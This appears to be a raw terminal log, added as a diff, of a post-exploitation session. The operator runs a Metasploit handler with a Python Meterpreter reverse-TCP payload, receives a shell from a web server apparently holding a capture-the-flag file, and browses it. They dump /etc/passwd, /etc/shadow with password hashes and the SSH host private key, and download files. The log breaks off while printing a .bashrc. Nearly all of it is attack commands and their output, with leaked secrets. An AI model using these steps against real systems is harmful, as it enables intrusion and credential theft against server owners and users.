@@ -1,0 +1,1488 @@
+root@kali:~# msfconsole
+[-] Failed to connect to the database: could not connect to server: Connection refused
+	Is the server running on host "localhost" (::1) and accepting
+	TCP/IP connections on port 5432?
+could not connect to server: Connection refused
+	Is the server running on host "localhost" (127.0.0.1) and accepting
+	TCP/IP connections on port 5432?
+
+                                                  
+
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN$                           vMMMM
+MMMNl  MMMMM             MMMMM  JMMMM
+MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+MMMMR  ?MMNM             MMMMM .dMMMM
+MMMMNm `?MMM             MMMM` dMMMMM
+MMMMMMN  ?MM             MM?  NMMMMMN
+MMMMMMMMNe                 JMMMMMNMMM
+MMMMMMMMMMNm,            eMMMMMNMMNMM
+MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+        https://metasploit.com
+
+
+       =[ metasploit v4.17.8-dev                          ]
++ -- --=[ 1803 exploits - 1027 auxiliary - 311 post       ]
++ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > use exploit/multi/ha
+use exploit/multi/hams/steamed  use exploit/multi/handler       
+msf > use exploit/multi/handler
+msf exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(multi/handler) > set payload python/
+set payload python/meterpreter/bind_tcp          set payload python/meterpreter_reverse_http
+set payload python/meterpreter/bind_tcp_uuid     set payload python/meterpreter_reverse_https
+set payload python/meterpreter/reverse_http      set payload python/meterpreter_reverse_tcp
+set payload python/meterpreter/reverse_https     set payload python/shell_bind_tcp
+set payload python/meterpreter/reverse_tcp       set payload python/shell_reverse_tcp
+set payload python/meterpreter/reverse_tcp_ssl   set payload python/shell_reverse_tcp_ssl
+set payload python/meterpreter/reverse_tcp_uuid  set payload python/shell_reverse_udp
+set payload python/meterpreter_bind_tcp          
+msf exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
+payload => python/meterpreter/reverse_tcp
+msf exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(multi/handler) > set LPORT 4554
+LPORT => 4554
+msf exploit(multi/handler) > set LHOST 192.168.0.4
+LHOST => 192.168.0.4
+msf exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.0.4:4554 
+[*] Sending stage (53508 bytes) to 10.0.3.178
+[*] Meterpreter session 1 opened (192.168.0.4:4554 -> 10.0.3.178:45030) at 2018-09-07 20:07:44 -0400
+
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Drop into irb scripting mode
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play an audio file on target system, nothing written on disk
+
+meterpreter > whoami
+[-] Unknown command: whoami.
+meterpreter > sysinfo
+Computer        : world102-cuiteur
+OS              : Linux 4.15.0-1018-gcp #19-Ubuntu SMP Thu Aug 16 13:38:55 UTC 2018
+Architecture    : x64
+System Language : C
+Meterpreter     : python/linux
+meterpreter > ls
+Listing: /var/www/html/php
+==========================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100775/rwxrwxr-x  1508   fil   2018-08-27 19:36:07 -0400  abonnements.php
+100775/rwxrwxr-x  1476   fil   2018-08-27 19:36:07 -0400  abonnes.php
+100775/rwxrwxr-x  33881  fil   2018-09-07 10:57:00 -0400  bibli_cuiteur.php
+100775/rwxrwxr-x  26429  fil   2018-08-27 19:36:07 -0400  bibli_generale.php
+100775/rwxrwxr-x  2047   fil   2018-08-27 19:36:07 -0400  blabla.php
+100775/rwxrwxr-x  12042  fil   2018-08-27 19:36:07 -0400  comparaison_requetes.txt
+100775/rwxrwxr-x  12347  fil   2018-09-03 22:26:24 -0400  compte.php
+100775/rwxrwxr-x  9444   fil   2018-08-27 19:36:07 -0400  cuiteur.php
+100775/rwxrwxr-x  151    fil   2018-08-27 19:36:07 -0400  deconnexion.php
+100775/rwxrwxr-x  6095   fil   2018-08-27 19:36:07 -0400  inscription.php
+100775/rwxrwxr-x  1656   fil   2018-08-27 19:36:07 -0400  mentions.php
+100755/rwxr-xr-x  450    fil   2018-09-07 20:05:07 -0400  ne0.py
+100644/rw-r--r--  20     fil   2018-09-07 10:40:11 -0400  python
+100775/rwxrwxr-x  1773   fil   2018-08-27 19:36:07 -0400  recherche.php
+100775/rwxrwxr-x  1718   fil   2018-08-27 19:36:07 -0400  recherche_old.php
+100775/rwxrwxr-x  1181   fil   2018-08-27 19:36:07 -0400  suggestions.php
+100775/rwxrwxr-x  3873   fil   2018-08-27 19:36:07 -0400  tendances.php
+100755/rwxr-xr-x  908    fil   2018-09-07 19:47:37 -0400  tmpbrfyv.php
+100666/rw-rw-rw-  727    fil   2018-09-07 19:47:37 -0400  tmpuftku.php
+100775/rwxrwxr-x  3465   fil   2018-08-27 19:36:07 -0400  utilisateur.php
+
+meterpreter > cd ..
+meterpreter > ls
+Listing: /var/www/html
+======================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+100600/rw-------  100675  fil   2018-08-27 17:06:06 -0400  flag_ef48c84e06e4fabbe6d6e157d6694ca137b32a4a.jpg
+40775/rwxrwxr-x   4096    dir   2018-08-27 19:36:07 -0400  html
+40775/rwxrwxr-x   4096    dir   2018-09-07 19:14:14 -0400  images
+100644/rw-r--r--  11010   fil   2018-09-06 03:12:50 -0400  index.html
+100775/rwxrwxr-x  3916    fil   2018-09-07 19:28:01 -0400  index.php
+40777/rwxrwxrwx   4096    dir   2018-09-07 20:05:07 -0400  php
+40775/rwxrwxr-x   4096    dir   2018-08-27 19:36:07 -0400  styles
+40775/rwxrwxr-x   4096    dir   2018-09-04 07:17:02 -0400  upload
+
+meterpreter > cd ..
+meterpreter > ls
+Listing: /var/www
+=================
+
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40775/rwxrwxr-x  4096  dir   2018-09-07 19:28:07 -0400  html
+
+meterpreter > cd /
+meterpreter > ls
+Listing: /
+==========
+
+Mode              Size      Type  Last modified              Name
+----              ----      ----  -------------              ----
+40755/rwxr-xr-x   4096      dir   2018-08-27 16:36:33 -0400  bin
+40755/rwxr-xr-x   4096      dir   2018-08-27 16:37:02 -0400  boot
+40755/rwxr-xr-x   3620      dir   2018-09-04 04:32:25 -0400  dev
+40755/rwxr-xr-x   4096      dir   2018-09-04 07:39:44 -0400  etc
+40755/rwxr-xr-x   4096      dir   2018-09-04 07:22:11 -0400  home
+100644/rw-r--r--  19906299  fil   2018-08-27 16:37:02 -0400  initrd.img
+100644/rw-r--r--  19902389  fil   2018-08-27 16:13:26 -0400  initrd.img.old
+40755/rwxr-xr-x   4096      dir   2018-08-08 12:18:34 -0400  lib
+40755/rwxr-xr-x   4096      dir   2018-08-08 12:01:02 -0400  lib64
+40700/rwx------   16384     dir   2018-08-08 12:01:01 -0400  lost+found
+40755/rwxr-xr-x   4096      dir   2018-08-08 12:01:02 -0400  media
+40755/rwxr-xr-x   4096      dir   2018-08-08 12:01:02 -0400  mnt
+40755/rwxr-xr-x   4096      dir   2018-08-08 12:01:02 -0400  opt
+40555/r-xr-xr-x   0         dir   2018-08-27 19:56:14 -0400  proc
+40700/rwx------   4096      dir   2018-09-07 10:57:00 -0400  root
+40755/rwxr-xr-x   1020      dir   2018-09-07 19:05:11 -0400  run
+40755/rwxr-xr-x   4096      dir   2018-08-27 16:37:52 -0400  sbin
+40755/rwxr-xr-x   4096      dir   2018-08-11 07:57:50 -0400  snap
+40755/rwxr-xr-x   4096      dir   2018-08-08 12:01:02 -0400  srv
+40555/r-xr-xr-x   0         dir   2018-09-03 15:41:04 -0400  sys
+41777/rwxrwxrwx   4096      dir   2018-09-07 20:05:07 -0400  tmp
+40755/rwxr-xr-x   4096      dir   2018-08-08 12:01:07 -0400  usr
+40755/rwxr-xr-x   4096      dir   2018-08-27 16:46:21 -0400  var
+100600/rw-------  8232696   fil   2018-08-27 16:13:44 -0400  vmlinuz
+100600/rw-------  8226672   fil   2018-08-08 12:19:18 -0400  vmlinuz.old
+
+meterpreter > cd home/ubuntu
+meterpreter > ls
+Listing: /home/ubuntu
+=====================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100644/rw-r--r--  220    fil   2018-08-11 07:57:37 -0400  .bash_logout
+100644/rw-r--r--  3771   fil   2018-08-11 07:57:37 -0400  .bashrc
+100644/rw-r--r--  807    fil   2018-08-11 07:57:37 -0400  .profile
+40700/rwx------   4096   dir   2018-08-27 16:12:38 -0400  .ssh
+100600/rw-------  58891  fil   2018-08-27 16:49:11 -0400  aef91a1137.jpg
+
+meterpreter > download aef91a1137.jpg
+[*] Downloading: aef91a1137.jpg -> aef91a1137.jpg
+[*] Downloaded 57.51 KiB of 57.51 KiB (100.0%): aef91a1137.jpg -> aef91a1137.jpg
+[*] download   : aef91a1137.jpg -> aef91a1137.jpg
+meterpreter > cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+_chrony:x:111:115:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+printer:x:1001:1002::/home/printer:/bin/bash
+nikos:x:1002:1003::/home/nikos:/bin/bash
+pontus:x:1003:1004::/home/pontus:/bin/bash
+tterranigma:x:1004:1005::/home/tterranigma:/bin/bash
+mysql:x:112:116:MySQL Server,,,:/nonexistent:/bin/false
+root122:x:1005:1006::/home/root122:/bin/bash
+svetlomirpetrov:x:1006:1007::/home/svetlomirpetrov:/bin/bash
+pontusj:x:1007:1008::/home/pontusj:/bin/bash
+printer_25132:x:1008:4::/home/printer_25132:/bin/bash
+spider:x:1009:1009:,,,:/home/spider:/bin/bash
+meterpreter > cat /etc/shadow
+root:$6$47039e573efd03b4$e354qM/uzkFKd1YLZefmRjfTcn/g7AkIzEmZtEiMcqSe/32foHbpaaVf36vHxcHKEiw1COKkHPgrItMkJGVZv/:17770:0:99999:7:::
+daemon:*:17751:0:99999:7:::
+bin:*:17751:0:99999:7:::
+sys:*:17751:0:99999:7:::
+sync:*:17751:0:99999:7:::
+games:*:17751:0:99999:7:::
+man:*:17751:0:99999:7:::
+lp:*:17751:0:99999:7:::
+mail:*:17751:0:99999:7:::
+news:*:17751:0:99999:7:::
+uucp:*:17751:0:99999:7:::
+proxy:*:17751:0:99999:7:::
+www-data:*:17751:0:99999:7:::
+backup:*:17751:0:99999:7:::
+list:*:17751:0:99999:7:::
+irc:*:17751:0:99999:7:::
+gnats:*:17751:0:99999:7:::
+nobody:*:17751:0:99999:7:::
+systemd-network:*:17751:0:99999:7:::
+systemd-resolve:*:17751:0:99999:7:::
+syslog:*:17751:0:99999:7:::
+messagebus:*:17751:0:99999:7:::
+_apt:*:17751:0:99999:7:::
+lxd:*:17751:0:99999:7:::
+uuidd:*:17751:0:99999:7:::
+dnsmasq:*:17751:0:99999:7:::
+landscape:*:17751:0:99999:7:::
+sshd:*:17751:0:99999:7:::
+pollinate:*:17751:0:99999:7:::
+_chrony:*:17751:0:99999:7:::
+ubuntu:!:17754:0:99999:7:::
+printer:*:17754:0:99999:7:::
+nikos:*:17754:0:99999:7:::
+pontus:*:17754:0:99999:7:::
+tterranigma:*:17770:0:99999:7:::
+mysql:!:17770:0:99999:7:::
+root122:*:17771:0:99999:7:::
+svetlomirpetrov:*:17771:0:99999:7:::
+pontusj:*:17776:0:99999:7:::
+printer_25132:$6$w8LOUb1A$tI5uAQaxhOxXNufYeUTQ0DYjPsJVPIzkFacIrQ.McQ91ru3cO73djgWD15mrEyrJek18w9RugEafHqAu3kg2G/:17778:0:99999:7:::
+spider:$6$F4OPpHUE$8cVNVO4oHMKL7/LScrV0cl4E/cr55W46f1HItx5lF4fiIm8q381Rh6RorhyU0xT/Eo31fX2VYAHoi4oRX5joM.:17778:0:99999:7:::
+meterpreter > cat /etc/group
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:syslog,ubuntu,printer,nikos,pontus,tterranigma,root122,svetlomirpetrov,pontusj
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:ubuntu,printer,nikos,pontus,tterranigma,root122,svetlomirpetrov,pontusj
+fax:x:21:
+voice:x:22:
+cdrom:x:24:ubuntu,printer,nikos,pontus,tterranigma,root122,svetlomirpetrov,pontusj
+floppy:x:25:ubuntu,printer,nikos,pontus,tterranigma,root122,svetlomirpetrov,pontusj
+tape:x:26:
+sudo:x:27:ubuntu,spider,printer_25132
+audio:x:29:ubuntu,printer,nikos,pontus,tterranigma,root122,svetlomirpetrov,pontusj
+dip:x:30:ubuntu,printer,nikos,pontus,tterranigma,root122,svetlomirpetrov,pontusj
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:ubuntu,printer,nikos,pontus,tterranigma,root122,svetlomirpetrov,pontusj
+sasl:x:45:
+plugdev:x:46:ubuntu,printer,nikos,pontus,tterranigma,root122,svetlomirpetrov,pontusj
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-network:x:102:
+systemd-resolve:x:103:
+input:x:104:
+crontab:x:105:
+syslog:x:106:
+messagebus:x:107:
+lxd:x:108:ubuntu,printer,nikos,pontus,tterranigma,root122,svetlomirpetrov,pontusj
+mlocate:x:109:
+uuidd:x:110:
+ssh:x:111:
+landscape:x:112:
+admin:x:113:
+netdev:x:114:ubuntu,printer,nikos,pontus,tterranigma,root122,svetlomirpetrov,pontusj
+_chrony:x:115:
+ubuntu:x:1000:printer,nikos,pontus,tterranigma,root122,svetlomirpetrov,pontusj
+google-sudoers:x:1001:printer,nikos,pontus,tterranigma,root122,svetlomirpetrov,pontusj
+printer:x:1002:
+nikos:x:1003:
+pontus:x:1004:
+tterranigma:x:1005:
+mysql:x:116:
+ssl-cert:x:117:
+root122:x:1006:
+svetlomirpetrov:x:1007:
+pontusj:x:1008:
+spider:x:1009:
+meterpreter > ?
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Drop into irb scripting mode
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play an audio file on target system, nothing written on disk
+
+meterpreter > ifconfig
+
+Interface  1
+============
+Name         : lo
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 65536
+Flags        : UP LOOPBACK RUNNING
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::
+
+
+Interface  2
+============
+Name         : ens4
+Hardware MAC : 42:01:0a:4a:93:b2
+MTU          : 1500
+Flags        : UP BROADCAST RUNNING MULTICAST
+IPv4 Address : 10.74.147.178
+IPv4 Netmask : 255.255.252.0
+IPv4 Address : 10.0.3.178
+IPv4 Netmask : 255.255.255.255
+IPv6 Address : fe80::4001:aff:fe4a:93b2
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+meterpreter > getenv
+[-] None of the specified environment variables were found/set.
+meterpreter > cat /etc/ssh/ssh_host_rsa_key
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAxbus5M60hwVJTVkCt88gEa+IL6++MaICNr0pK+skQtR9b828
+hS3zL0CRp5FmdIuUyLjo1G9+QtxP/tt7cwtPk+q/F+mN427HCiwHBjyfX+OptVir
+6K3JlPffvcmK8CVis/C2CIqBIji2vaH3YP/uiXXfY/i0ounOS4ca58ZHQJyVNztJ
+BNpXH18XK9DKKDZGCxohVubADwmYWOHlYIdhnWETHsOCOIVtiulOblcEgDuYoWzB
+1vPWCzm8pCgCYvYuhQ1oYaaAjSd79cv59IAHzDwZCbGsTsy1GvaSG30bUpl3vPVX
+ME3Z6+EM60wv0JXO1RiWP0WTLe1wIfO0Bw0MhwIDAQABAoIBACLzSVwoLUCwboR9
+dz2GHuUBYdEL/1JGkJ2cUeqxZXdql8FrXCcuOA3iG9zClpmDEoloJb9m9apbxsgF
+g4ySMz6x/5T6c1n/+q6RmaxAiusoEpc7VSeLkFYEekfRl/1anlev9H0N/kVOQP7D
+4jYDBubFLvc8vrENIqm298qAAZgpxTLz/PR9dD78zUYT8Cy5mhG53UHvARX4zDIF
+m28fjm2e+wBDz5f4uwL/2ifmiptIOId63wQj5yuqlQnL8zdBKzhE/5C3m2zwOAuv
+85uEnk1towHM9NJMWQtQBBJQn0dUdzeL6yTnUNFOV9PqBlmBUJ0l4MELNAniCbXk
+HZ+DdAECgYEA+vyQBsk0Id3+Kz4hOMv9IzQwU7ZWhdB0Uit+W5F7vyEFAVCiyGiQ
+vGF3o0e2/kqAaziD38gSX3Z0Hv3Z7dSr5uEZ1ok/RvOOXaDUGPYRyesDBnnfVOlu
+GD4TSylKmD87v3cvWLDNApAXhA+uSv/jGuurez3OIiw0fKC3wEo/oz8CgYEAya7M
+JQ0ZSSKXz5PYzL+4R1zWYNBhfJwQ+68d7+RfIubZDN8gYBfnixGDaTYq7iAZgIKl
+jqHo/gQdSnV80gKGVe3Y4JHhTJftKby/UeO6wQRRde7wQBNPguGjSm40PqglLWY8
+CLvpuzv7iu32axoTXPZdmAYnEF0rFOu2khDu7LkCgYB1rsC1fdgE3TsU+Y/IOtWZ
+kRnr1n4hRkmUUbJwqvlz976KDE4XW/gpbCYVmEW0XCh0nc4vunbq7faqpWpuup5T
+pk5gKoBR+1dQjV2FyrMykxAbFD/kZ4NouIqBXn4MfvG75916X4Pw5LEyCcw2fF73
+O3NvWN5zZXjCyvT9o5LNLwKBgQCIL86OHmA6sG9OrgkxiSyIk7n3Of76Q/B7424V
+tWJAkR1zwZ99A+dIUxUnkHpAvdA6pP3iaJaKIIEe7GLS9P19PNS8IAXA0L5G9rtC
+MsLC34WaWzREMEX6nR7EfdItlSE1nNlhFHLqCcD7uWAyRjNZDMt6gn0SYbdbsydf
+TqvnkQKBgQCZ7uHG/LRL9kIS7m3WjG9FulmbLVUSyrl9dVRupDlTu99DxCRL4qoB
+ThdFItXR81MZE7SlfJ+UZ17NUZ/7vXVu64uB0N8Ecy5LIsZ1VwglKbPua7fWE7qZ
+q7xsPbJ40IHSOzJ1kUnbjuu9+ciY0eeDt0NpUCgC2yRzgqZ071iunA==
+-----END RSA PRIVATE KEY-----
+meterpreter > download /etc/ssh/ssh_host_rsa_key
+[*] Downloading: /etc/ssh/ssh_host_rsa_key -> ssh_host_rsa_key
+[*] Downloaded 1.64 KiB of 1.64 KiB (100.0%): /etc/ssh/ssh_host_rsa_key -> ssh_host_rsa_key
+[*] download   : /etc/ssh/ssh_host_rsa_key -> ssh_host_rsa_key
+meterpreter > ls -lha /home/root
+Usage: ls [options] [glob/path]
+
+Lists contents of directory or file info, searchable
+
+OPTIONS:
+
+    -R        Recursively list subdirectories encountered
+    -S <opt>  Search string on filename (as regular expression)
+    -h        Help banner
+    -l        List in long format (default)
+    -r        Reverse sort order
+    -s        Sort by size
+    -t        Sort by time
+    -x        Show short file names
+
+meterpreter > ls /home/root
+[-] stdapi_fs_stat: Operation failed: Python exception: FileNotFoundError
+meterpreter > ls /home
+Listing: /home
+==============
+
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40755/rwxr-xr-x  4096  dir   2018-08-11 07:57:47 -0400  nikos
+40755/rwxr-xr-x  4096  dir   2018-08-11 07:57:47 -0400  pontus
+40755/rwxr-xr-x  4096  dir   2018-09-02 10:28:34 -0400  pontusj
+40755/rwxr-xr-x  4096  dir   2018-08-27 16:35:28 -0400  printer
+40755/rwxr-xr-x  4096  dir   2018-09-06 04:44:16 -0400  printer_25132
+40755/rwxr-xr-x  4096  dir   2018-09-07 18:49:31 -0400  root122
+40755/rwxr-xr-x  4096  dir   2018-08-28 09:42:45 -0400  svetlomirpetrov
+40755/rwxr-xr-x  4096  dir   2018-08-27 16:12:47 -0400  tterranigma
+40755/rwxr-xr-x  4096  dir   2018-08-27 16:49:11 -0400  ubuntu
+
+meterpreter > ls /home/ubuntu
+Listing: /home/ubuntu
+=====================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100644/rw-r--r--  220    fil   2018-08-11 07:57:37 -0400  .bash_logout
+100644/rw-r--r--  3771   fil   2018-08-11 07:57:37 -0400  .bashrc
+100644/rw-r--r--  807    fil   2018-08-11 07:57:37 -0400  .profile
+40700/rwx------   4096   dir   2018-08-27 16:12:38 -0400  .ssh
+100600/rw-------  58891  fil   2018-08-27 16:49:11 -0400  aef91a1137.jpg
+
+meterpreter > cat /home/ubuntu/.ssh
+[-] /home/ubuntu/.ssh is a directory
+meterpreter > cat /home/ubuntu/.bashrc
+# ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+
+# If not running interactively, don't do anything
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+
+# don't put duplicate lines or lines starting with space in the history.
+# See bash(1) for more options
+HISTCONTROL=ignoreboth
+
+# append to the history file, don't overwrite it
+shopt -s histappend
+
+# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
+HISTSIZE=1000
+HISTFILESIZE=2000
+
+# check the window size after each command and, if necessary,
+# update the values of LINES and COLUMNS.
+shopt -s checkwinsize
+
+# If set, the pattern "**" used in a pathname expansion context will
+# match all files and zero or more directories and subdirectories.
+#shopt -s globstar
+
+# make less more friendly for non-text input files, see lesspipe(1)
+[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"
+
+# set variable identifying the chroot you work in (used in the prompt below)
+if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
+    debian_chroot=$(cat /etc/debian_chroot)
+fi
+
+# set a fancy prompt (non-color, unless we know we "want" color)
+case "$TERM" in
+    xterm-color|*-256color) color_prompt=yes;;
+esac
+
+# uncomment for a colored prompt, if the terminal has the capability; turned
+# off by default to not distract the user: the focus in a terminal window
+# should be on the output of commands, not on the prompt
+#force_color_prompt=yes
+
+if [ -n "$force_color_prompt" ]; then
